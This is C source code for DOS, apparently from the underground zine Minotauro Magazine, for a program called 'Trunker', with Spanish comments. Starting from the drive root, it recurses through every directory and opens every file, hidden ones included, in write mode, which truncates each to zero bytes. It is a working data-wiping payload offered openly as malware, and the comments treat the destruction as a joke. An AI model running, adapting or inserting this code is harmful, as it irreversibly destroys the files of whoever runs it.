// Minotauro Magazine
// Trunker By Jason.
// Turbo C++ 3.0

#include <stdlib.h>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>
#include <dir.h>
#include <conio.h>

// Estas son las librerias necesarias para la ejecucion de este programa

void makdir();
// Rutina de entrada a directorios
void destruccion();
// Rutina para truncar los files del directorio donde entro

void main()
{
  clrscr();
  printf("Truncando files... sea paciente ;-)..\n");
  chdir("\\");
// es necesario poner 2 barras "\\" ya que el C usa la "\" para funciones 
// especificas como las que se ven arriba de "\n" eso manda un CR LF 
// caracteres 10 y 13 en decimal o Ah y Dh en hexa de la tabla ASCII
  makdir();
// Llamo a MAKDIR
}


void destruccion()
{
   FILE *archivo;
   struct ffblk ffblk;
   int done;
// Defino las variables

   done = findfirst("*.*",&ffblk,2);
// Busco en el directorio actual "*.*" incluyendo archivos ocultos
// Mientras haya archivos..
   while (!done)
   {
      if ((archivo = fopen(ffblk.ff_name, "wb")) == NULL)
// Abro file ("wb" write binary) binario para escritura
	{
	   fprintf(stderr, "Error abriendo archivo...\n");
// Si llego aca hay error al abrir el file
	}
      fwrite(0, 0, 1, archivo);
// Escribo NADA :-)
      fclose(archivo);
// Cierro el file
      done = findnext(&ffblk);
// Que pase el que sigue ;-)
   }
}


void makdir()
{
   struct ffblk ffblk;
   int done;
// Defino variables

   destruccion();
// Llamo a destruccion para truncar los del directorio raiz
   done = findfirst("*.*",&ffblk,16);
// Busco en el directorio actual "*.*" incluyendo directorios
   while (!done)
   {
      if((ffblk.ff_name[0] != *".") && (ffblk.ff_attrib == 16))
// Si es un directorio.. que no sea que su primer caracter no sea "."
// o sea "." o ".." entonces entro
	{
	   chdir(ffblk.ff_name);
// Entro al directorio que encontre
	   destruccion();
// Trunco los files
	   makdir();
// Me llamo de nuevo
	   chdir("..");
// Vuelvo al directorio anterior
	 }
      done = findnext(&ffblk);
// Busco el proximo
   }
}
